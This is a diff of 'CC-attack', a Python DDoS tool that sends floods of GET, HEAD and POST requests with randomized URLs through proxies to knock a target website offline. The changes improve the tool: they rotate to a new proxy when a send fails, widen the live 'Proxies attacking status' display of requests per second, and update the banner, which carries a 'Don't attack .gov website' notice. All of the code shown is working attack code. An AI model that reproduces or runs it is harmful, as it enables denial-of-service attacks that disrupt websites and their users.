@@ -25,15 +25,15 @@ print ('''
 	 CC/////  CC/////   | ddos tool |/ 
 	  CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Version 3.6 (2020/11/4)
+Version 3.6 (2020/11/10)
 							C0d3d by L330n123
 ┌─────────────────────────────────────────────┐
 │        Tos: Don't attack .gov website       │
 ├─────────────────────────────────────────────┤
 │                 New stuff:                  │
-|          + Changed Output Indicator         |
-│          + Added Url Parser                 │
-|          - Removed Unnecessary Code         |
+|          [+] Optimization                   │
+|          [+] Changed Output                 │
+│          [+] Added Url Parser               │
 ├─────────────────────────────────────────────┤
 │ Link: https://github.com/Leeon123/CC-attack │
 └─────────────────────────────────────────────┘''')
@@ -146,7 +146,7 @@ def getuseragent():
 		return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'
 
 def randomurl():
-	 return str(Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings) + Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings))
+	return str(Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings) + Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings))
 
 def GenReqHeader(method):
 	header = ""
@@ -265,8 +265,8 @@ def OutputToScreen(ind_rlock):
 	while 1:
 		if i > 3:
 			i = 0
-		print("{:^50}".format("Proxies attacking status"))
-		print("{:^50}".format("IP:PORT          |         RPS"))
+		print("{:^70}".format("Proxies attacking status"))
+		print("{:^70}".format("IP:PORT   <->   RPS    "))
 		#1. xxx.xxx.xxx.xxx:xxxxx ==> Rps: xxxx
 		ind_rlock.acquire()
 		top10 = sorted(ind_dict, key=ind_dict.get, reverse=True)
@@ -277,16 +277,16 @@ def OutputToScreen(ind_rlock):
 				top = top10[num]
 				rps = ind_dict[top]
 				ind_dict[top] = 0
-			print("{:^50}".format("{:2d}. {:^22s} | Rps: {:d}".format(num+1,top,rps)))
+			print("{:^70}".format("{:2d}. {:^22s} | Rps: {:d}".format(num+1,top,rps)))
 		total = 0
 		for k,v in ind_dict.items():
 			total = total + v
 			ind_dict[k] = 0
 		ind_rlock.release()
-		print("{:^50}".format(" ["+sp_char[i]+"] CC attack | Total Rps:"+str(total)))
+		print("{:^70}".format(" ["+sp_char[i]+"] CC attack | Total Rps:"+str(total)))
 		i+=1
 		time.sleep(1)
-		print("\n"*50)
+		print("\n"*100)
 
 def cc(event,socks_type,ind_rlock):
 	global ind_dict
@@ -310,7 +310,10 @@ def cc(event,socks_type,ind_rlock):
 				for _ in range(multiple+1):
 					get_host = "GET " + path + "?" + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
 					request = get_host + header
-					s.send(str.encode(request))
+					sent = s.send(str.encode(request))
+					if not sent:
+						proxy = Choice(proxies).strip().split(":")
+						break
 				s.close()
 			except:
 				s.close()
@@ -342,7 +345,10 @@ def head(event,socks_type,ind_rlock):#HEAD MODE
 				for _ in range(multiple+1):
 					head_host = "HEAD " + path + "?" + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
 					request = head_host + header
-					s.send(str.encode(request))
+					sent = s.send(str.encode(request))
+					if not sent:
+						proxy = Choice(proxies).strip().split(":")
+						break
 				s.close()
 			except:
 				s.close()
@@ -372,7 +378,10 @@ def post(event,socks_type,ind_rlock):
 				s = ctx.wrap_socket(s,server_hostname=target)
 			try:
 				for _ in range(multiple+1):
-					s.sendall(str.encode(request))
+					sent = s.send(str.encode(request))
+					if not sent:
+						proxy = Choice(proxies).strip().split(":")
+						break
 				s.close()
 			except:
 				s.close()
@@ -477,7 +486,9 @@ def checking(lines,socks_type,ms,rlock,):#Proxy checker coded by Leeon123
 			if protocol == "https":
 				ctx = ssl.SSLContext()
 				s = ctx.wrap_socket(s,server_hostname=target)
-			s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
+			sent = s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
+			if not sent:
+				err += 1
 			s.close()
 			break
 		except:
